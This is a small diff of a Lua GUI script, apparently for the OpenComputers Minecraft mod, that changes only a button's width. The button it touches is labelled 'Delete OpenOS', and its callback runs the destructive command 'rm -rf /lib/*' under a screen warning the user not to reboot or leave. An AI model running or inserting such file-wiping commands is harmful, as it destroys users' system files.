@@ -53,7 +53,7 @@ gpu.set(30, 10, "2. Don't Reboot Computer")
 os.sleep(0.3)
 gpu.set(30, 12, "3. Don't leave this program")
 
-mayner.DrawButton(30, 14, 12, 3, "Delete OpenOS", 0x000000, 0xFFFFFF, function()
+mayner.DrawButton(30, 14, 13, 3, "Delete OpenOS", 0x000000, 0xFFFFFF, function()
       ECS.error("Okay...")
       shell.execute("rm -rf /lib/*")
       ECS.error("Lib folder removed!")
